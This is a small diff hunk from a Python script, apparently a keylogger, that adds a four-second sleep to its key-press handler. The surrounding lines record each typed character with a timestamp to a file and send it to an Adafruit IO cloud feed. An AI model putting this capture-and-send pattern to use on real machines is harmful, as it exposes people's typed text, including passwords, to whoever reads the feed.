@@ -23,6 +23,7 @@ def on_press(key):
         upper = str(key.char).upper()
         f.write(str(ts) + ':' + 'KeyPressed' + ':' + upper + '\n')
         aio.send(adafeed.key, upper)
+        time.sleep(4)
     except:
         print('special key {0} pressed'.format(key))
         ts = calendar.timegm(time.gmtime())
